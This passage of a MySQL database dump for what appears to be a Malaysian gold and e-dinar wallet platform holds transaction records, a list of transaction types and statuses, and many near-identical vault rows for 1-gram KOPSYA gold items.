(4, 1, 9, '12.12', 0, 1, 6, 'deposit', '2016-04-23 22:36:04', 0, 3, 5, 1, 'BgvWCmQgEiJO63zS', ''),
(5, 1, 9, '12.12', 0, 1, 6, 'deposit', '2016-04-23 22:36:04', 0, 3, 5, 1, 'Cfs5lTCriT8q1gEx', ''),
(6, 1, 25, '202.12', 0, 1, 6, '', '2016-04-23 22:38:45', 0, 3, 5, 1, '1yZVTv6Du9SiB8EF', ''),
(7, 0, 1, '20', 0, 1, 0, '', '2016-04-24 00:24:43', 0, 33, 1, 0, NULL, ''),
(8, 1, 25, '202.12', 0, 1, 6, '', '2016-04-23 22:38:45', 0, 3, 5, 1, 'JOHa1I30YZbJSYfh', ''),
(9, 1, 25, '202.12', 0, 1, 6, '', '2016-04-23 22:38:45', 0, 3, 5, 1, 'uX9G1VOa4Axeri0h', ''),
(10, 1, 25, '202.12', 0, 1, 6, '', '2016-04-23 22:38:45', 0, 3, 5, 1, 'bNmNX2fwRweJg46E', ''),
(11, 1, 25, '202.12', 0, 1, 6, '', '2016-04-23 22:38:45', 0, 3, 5, 1, '6Ik1nhSOnNgsfuIy', ''),
(12, 0, 1, '182.12', 0, 1, 0, '', '2016-04-24 00:29:58', 0, 33, 1, 0, NULL, ''),
(13, 26, 1, '2.00', 0, 1, 6, 'Deposit Fee<br /><br />Comment from admin:-<br />approve demo deposit', '2016-04-24 00:31:33', 0, 26, 1, 1, NULL, ''),
(14, 26, 1, '0.12', 0, 1, 13, 'GST Tax Fee<br /><br />Comment from admin:-<br />approve demo deposit', '2016-04-24 00:31:33', 0, 25, 1, 1, NULL, ''),
(15, 1, 40, '252.12', 0, 1, 6, 'E dinar dinarpal<br /><br />Comment from admin:-<br />your deposit has been approved - Arash ', '2016-04-24 18:18:26', 0, 3, 1, 1, '9oIfzo6YPRs3tEbc', ''),
(16, 0, 1, '252.12', 0, 1, 0, 'bangtih82', '2016-04-24 18:31:59', 0, 33, 1, 0, NULL, ''),
(17, 40, 1, '2.00', 0, 1, 6, 'Deposit Fee<br /><br />Comment from admin:-<br />your deposit has been approved - Arash ', '2016-04-24 18:32:29', 0, 26, 1, 1, NULL, ''),
(18, 40, 1, '0.12', 0, 1, 13, 'GST Tax Fee<br /><br />Comment from admin:-<br />your deposit has been approved - Arash ', '2016-04-24 18:32:29', 0, 25, 1, 1, NULL, ''),
(19, 0, 1, '202.12', 0, 1, 0, 'arash - deposit', '2016-04-24 18:37:50', 0, 33, 1, 0, NULL, ''),
(20, 7, 1, '2.00', 0, 1, 6, 'Deposit Fee<br /><br />Comment from admin:-<br />thanks', '2016-04-24 18:38:29', 0, 26, 1, 1, NULL, ''),
(21, 7, 1, '0.12', 0, 1, 13, 'GST Tax Fee<br /><br />Comment from admin:-<br />thanks', '2016-04-24 18:38:29', 0, 25, 1, 1, NULL, ''),
(22, 1, 2, '101060', 0, 1, 6, '', '2016-04-27 09:58:02', 0, 3, 2, 1, 'F75Jp5BRFp7mvgMB', ''),
(23, 1, 50, '222.332', 0, 1, 6, '<br /><br />Comment from admin:-<br />big guy from cradle thanks bebeh', '2016-04-27 14:56:50', 0, 3, 1, 1, 'UqZfbuYEjMywRklI', ''),
(24, 0, 1, '222.33', 0, 1, 0, 'thanks azzudin bebeh', '2016-04-27 15:00:05', 0, 33, 1, 0, NULL, ''),
(25, 50, 1, '2.22332', 0, 1, 6, 'Deposit Fee<br /><br />Comment from admin:-<br />big guy from cradle thanks bebeh', '2016-04-27 15:00:36', 0, 26, 1, 1, NULL, ''),
(26, 50, 1, '0.1333992', 0, 1, 13, 'GST Tax Fee<br /><br />Comment from admin:-<br />big guy from cradle thanks bebeh', '2016-04-27 15:00:36', 0, 25, 1, 1, NULL, ''),
(27, 50, 1, '200', 0, 1, 7, 'Purchase', '2016-04-27 15:06:24', 0, 23, 1, 0, NULL, ''),
(28, 50, 1, '2', 0, 1, 7, 'Keep Fee', '2016-04-27 15:06:24', 0, 24, 1, 0, NULL, ''),
(29, 50, 1, '0.12', 0, 1, 13, 'GST Tax', '2016-04-27 15:06:24', 0, 25, 1, 0, NULL, ''),
(30, 7, 50, '1', 1, 1, 9, 'RM1 untuk tuan hahahah', '2016-04-27 15:14:42', 0, 35, 1, 0, NULL, ''),
(31, 50, 1, '0.025', 1, 1, 10, 'RM1 untuk tuan hahahah', '2016-04-27 15:14:42', 0, 37, 1, 0, NULL, ''),
(32, 50, 1, '0.0015', 1, 1, 13, 'RM1 untuk tuan hahahah', '2016-04-27 15:14:42', 0, 25, 1, 0, NULL, ''),
(33, 1, 7, '20.212', 0, 1, 6, '<br /><br />', '2016-04-27 20:52:48', 0, 3, 1, 1, 'TcXu3VXOgO5rrGt9', ''),
(34, 7, 1, '0.20212', 0, 1, 6, 'Deposit Fee<br /><br />', '2016-04-27 20:53:35', 0, 26, 1, 1, NULL, ''),
(35, 7, 1, '0.0121272', 0, 1, 13, 'GST Tax Fee<br /><br />', '2016-04-27 20:53:35', 0, 25, 1, 1, NULL, ''),
(36, 7, 47, '100', 1, 1, 9, 'big boss fund', '2016-04-28 08:26:58', 0, 35, 1, 0, NULL, ''),
(37, 47, 1, '2.5', 1, 1, 10, 'big boss fund', '2016-04-28 08:26:58', 0, 37, 1, 0, NULL, ''),
(38, 47, 1, '0.15', 1, 1, 13, 'big boss fund', '2016-04-28 08:26:58', 0, 25, 1, 0, NULL, ''),
(39, 47, 7, '10', 2, 1, 9, 'Bayer hutang', '2016-04-28 08:35:04', 0, 35, 1, 0, NULL, ''),
(40, 7, 1, '0.25', 2, 1, 10, 'Bayer hutang', '2016-04-28 08:35:04', 0, 37, 1, 0, NULL, ''),
(41, 7, 1, '0.015', 2, 1, 13, 'Bayer hutang', '2016-04-28 08:35:04', 0, 25, 1, 0, NULL, ''),
(42, 47, 51, '10', 1, 1, 9, '', '2016-04-28 08:39:35', 0, 35, 1, 0, NULL, ''),
(43, 51, 1, '0.25', 1, 1, 10, '', '2016-04-28 08:39:35', 0, 37, 1, 0, NULL, ''),
(44, 51, 1, '0.015', 1, 1, 13, '', '2016-04-28 08:39:35', 0, 25, 1, 0, NULL, '');

-- --------------------------------------------------------

--
-- Table structure for table `transaction_status`
--

CREATE TABLE IF NOT EXISTS `transaction_status` (
  `ts_id` int(11) NOT NULL AUTO_INCREMENT,
  `ts_desc` varchar(200) NOT NULL,
  PRIMARY KEY (`ts_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `transaction_status`
--

INSERT INTO `transaction_status` (`ts_id`, `ts_desc`) VALUES
(1, 'Completed'),
(2, 'Pending'),
(3, 'Disputed'),
(4, 'Canceled'),
(5, 'Declined');

-- --------------------------------------------------------

--
-- Table structure for table `transaction_type`
--

CREATE TABLE IF NOT EXISTS `transaction_type` (
  `tt_id` int(11) NOT NULL AUTO_INCREMENT,
  `tt_desc` varchar(200) NOT NULL,
  `tt_code` varchar(200) NOT NULL,
  PRIMARY KEY (`tt_id`),
  UNIQUE KEY `tt_code` (`tt_code`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=38 ;

--
-- Dumping data for table `transaction_type`
--

INSERT INTO `transaction_type` (`tt_id`, `tt_desc`, `tt_code`) VALUES
(1, 'Send Payment', 'SP'),
(2, 'Withdrawal', 'WI'),
(3, 'Deposit', 'DE'),
(4, 'Amanah Deal', 'AD'),
(5, 'Purchase and Pawn', 'PP'),
(6, 'Pawn and Courier', 'PC'),
(7, 'Purchase and Keep', 'PK'),
(8, 'Payment Merchant', 'PM'),
(9, 'Redeem Gold/Silver', 'RGS'),
(10, 'Purchase and Courier', 'PUC'),
(11, 'Courier and Keep', 'CK'),
(12, 'Session Bidding Puchase', 'SBP'),
(13, 'Bidding Payment', 'BP'),
(14, 'Walk-in & Pawn', 'WiP'),
(15, 'Walk-in & Keep', 'WiK'),
(16, 'Refund', 'RE'),
(17, 'Convert to MYR', 'CM'),
(18, 'Safe Keeping Fee Payment', 'SKFP'),
(19, 'Loan Payment', 'LP'),
(20, 'Item Purchase (E-Dinar/E-Dirham -MYR)', 'IPD'),
(21, 'Item Purchase ( Physical Dinar & Dirham)', 'IPG'),
(22, 'Receive & Keep', 'RK'),
(23, 'Purchase', 'PU'),
(24, 'Keep Fee', 'KF'),
(25, 'GST Tax Fee', 'GST'),
(26, 'Deposit Fee', 'DF'),
(27, 'Bank Transfer Deposit', 'BTD'),
(28, 'Affiliate Commission', 'AC'),
(29, 'Withdrawal Money Fee', 'WM'),
(30, 'Withdrawal Gram Fee', 'WGF'),
(31, 'Withdrawal Gram', 'WG'),
(32, 'Bank Transaction Fee', 'BTF'),
(33, 'Inject Cash', 'IC'),
(34, 'Account Verification Fee', 'AV'),
(35, 'Send Payment Money', 'SPM'),
(36, 'Send Payment Money Fee', 'SPMF'),
(37, 'Receive Payment Money Fee', 'RPMF');

-- --------------------------------------------------------

--
-- Table structure for table `used_item`
--

CREATE TABLE IF NOT EXISTS `used_item` (
  `ui_id` int(11) NOT NULL AUTO_INCREMENT,
  `it_id` int(11) NOT NULL,
  `br_id` int(11) NOT NULL,
  `ic_id` int(11) NOT NULL,
  `isc_id` int(11) NOT NULL,
  `pu_id` int(11) NOT NULL,
  `ui_weight` varchar(200) NOT NULL DEFAULT '0',
  `ui_qty` int(11) NOT NULL DEFAULT '0',
  `ui_image` varchar(500) NOT NULL,
  `me_id` int(11) NOT NULL,
  `ui_status` int(11) NOT NULL DEFAULT '1',
  PRIMARY KEY (`ui_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `vault`
--

CREATE TABLE IF NOT EXISTS `vault` (
  `v_id` int(11) NOT NULL AUTO_INCREMENT,
  `v_image` varchar(2000) DEFAULT NULL,
  `v_image2` varchar(2000) DEFAULT NULL,
  `v_image3` varchar(2000) DEFAULT NULL,
  `v_image4` varchar(2000) DEFAULT NULL,
  `v_image5` varchar(2000) DEFAULT NULL,
  `v_name` varchar(200) NOT NULL,
  `v_price_rate` varchar(200) NOT NULL,
  `v_weight` varchar(200) NOT NULL,
  `v_cert` varchar(2000) DEFAULT NULL,
  `v_desc` varchar(2000) DEFAULT NULL,
  `br_id` int(11) NOT NULL,
  `itc_id` int(11) NOT NULL,
  `vt_id` int(11) NOT NULL,
  `me_id` int(11) NOT NULL,
  `isc_id` int(11) NOT NULL,
  `v_regdate` datetime NOT NULL,
  PRIMARY KEY (`v_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=101 ;

--
-- Dumping data for table `vault`
--

INSERT INTO `vault` (`v_id`, `v_image`, `v_image2`, `v_image3`, `v_image4`, `v_image5`, `v_name`, `v_price_rate`, `v_weight`, `v_cert`, `v_desc`, `br_id`, `itc_id`, `vt_id`, `me_id`, `isc_id`, `v_regdate`) VALUES
(1, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '200.00', '1', 'A1010001', NULL, 6, 3, 3, 50, 1, '0000-00-00 00:00:00'),
(2, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010002', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(3, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010003', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(4, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010004', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(5, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010005', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(6, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010006', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(7, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010007', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(8, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010008', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(9, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010009', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(10, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010010', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(11, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010011', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(12, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010012', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(13, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010013', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(14, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010014', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(15, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010015', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(16, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010016', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(17, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010017', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(18, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010018', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(19, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010019', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(20, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010020', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(21, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010021', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(22, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010022', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(23, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010023', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(24, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010024', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(25, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010025', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(26, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010026', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(27, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010027', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(28, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010028', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(29, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010029', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(30, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010030', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(31, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010031', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(32, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010032', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(33, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010033', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(34, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010034', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(35, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010035', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(36, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010036', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(37, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010037', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(38, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010038', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(39, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010039', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(40, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010040', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(41, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010041', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(42, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010042', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(43, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010043', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(44, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010044', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(45, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010045', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(46, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010046', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(47, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010047', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(48, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010048', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(49, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010049', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(50, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010050', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(51, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010051', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(52, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010052', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(53, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010053', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(54, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010054', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(55, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010055', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(56, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010056', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(57, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010057', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(58, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010058', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(59, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010059', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(60, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010060', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(61, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010061', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(62, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010062', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(63, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010063', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(64, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010064', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(65, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010065', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(66, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010066', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(67, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010067', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(68, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010068', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(69, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010069', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(70, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010070', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(71, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010071', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(72, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010072', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(73, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010073', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(74, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010074', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(75, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010075', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
(76, 'kopsya1gramdepan.png', 'kopsya1grambelakang.png', 'kopsya1gramdepanangkasa.png', '', '', 'KOPSYA Gold 1 Gram', '185.00', '1', 'A1010076', NULL, 6, 3, 3, 1, 1, '0000-00-00 00:00:00'),
